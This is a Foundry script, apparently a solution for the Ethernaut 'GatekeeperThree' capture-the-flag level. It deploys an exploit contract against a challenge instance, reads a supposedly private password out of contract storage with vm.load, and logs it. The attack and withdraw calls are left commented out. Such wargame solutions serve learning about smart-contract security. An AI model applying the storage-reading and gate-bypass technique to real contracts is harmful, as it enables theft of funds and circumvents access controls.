// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "../src/GatekeeperThree_exp.sol";
import {console, Script} from "forge-std/Script.sol";


contract GatekeeperThreeScript is Script {
    uint256 public deployer;
    SimpleTrick public trick;
    GatekeeperThree public gatekeeper;
    GatekeeperThree_exp public exp;

    function setUp() public {
        deployer = vm.envUint("PRIVATE_KEY");
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY_2");
        vm.startBroadcast(deployer);
        // gatekeeper = new GatekeeperThree();
        gatekeeper = GatekeeperThree(payable(address(0xEfd8678EF384186836A3bB8b3C9D08b8Fa98D7b8)));
        vm.stopBroadcast();
    }

    function run() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        vm.startBroadcast(deployer);
        // exp = new GatekeeperThree_exp{value: 0.0010001 ether}(gatekeeper);
        exp = new GatekeeperThree_exp{value: 1}(gatekeeper);

        address t = exp.init();
        uint256 password = uint256(vm.load(address(0xCC65041de7FCa669586D9721C0c0a49D898FACc2), bytes32(uint256(2))));
        console.log("[+]SimpleTrick Address1: ", t);
        console.log("[+]Password1: ", password);
        uint256 password2 = uint256(vm.load(t, bytes32(uint256(2))));
        console.log("[+]SimpleTrick Address2: ", t);
        console.log("[+]Password2: ", password2);
        // exp.attack(password);
        // exp.withdraw();
        vm.stopBroadcast();
    }

}